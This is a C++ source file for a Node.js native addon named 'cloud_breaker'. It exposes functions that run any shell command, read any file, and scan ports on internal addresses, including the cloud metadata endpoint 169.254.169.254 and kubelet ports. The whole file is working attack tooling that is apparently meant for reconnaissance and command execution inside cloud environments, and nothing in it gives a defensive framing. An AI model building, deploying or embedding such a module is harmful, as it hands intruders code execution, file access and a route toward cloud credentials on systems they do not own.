#include <napi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

using namespace Napi;

Value Execute(const CallbackInfo& info) {
    Env env = info.Env();
    std::string command = info[0].As<String>().Utf8Value();
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen((command + " 2>&1").c_str(), "r");
    if (!pipe) return String::New(env, "Error");
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) { result += buffer; }
    pclose(pipe);
    return String::New(env, result);
}

Value RawRead(const CallbackInfo& info) {
    Env env = info.Env();
    std::string path = info[0].As<String>().Utf8Value();
    std::ifstream file(path);
    if (!file.is_open()) return String::New(env, "Denied");
    std::string line, content;
    int count = 0;
    while (std::getline(file, line) && count < 50) {
        content += line + "\n";
        count++;
    }
    return String::New(env, content);
}

Value QuickProbe(const CallbackInfo& info) {
    Env env = info.Env();
    std::string ip_prefix = info[0].As<String>().Utf8Value();
    std::vector<std::string> targets = {
        ip_prefix + "1",
        ip_prefix + "2",
        "169.254.169.254",
        "127.0.0.1"
    };
    int ports[] = { 80, 443, 817, 10250, 10255 };
    std::string report = "";

    for (const auto& ip : targets) {
        for (int port : ports) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 80000;
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);

            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                report += "[+] OPEN: " + ip + ":" + std::to_string(port) + "\n";
            }
            close(sock);
        }
    }
    return String::New(env, report.empty() ? "No open ports found in target range." : report);
}

Object Init(Env env, Object exports) {
    exports.Set("execute", Function::New(env, Execute));
    exports.Set("rawRead", Function::New(env, RawRead));
    exports.Set("quickProbe", Function::New(env, QuickProbe));
    return exports;
}

NODE_API_MODULE(cloud_breaker, Init)
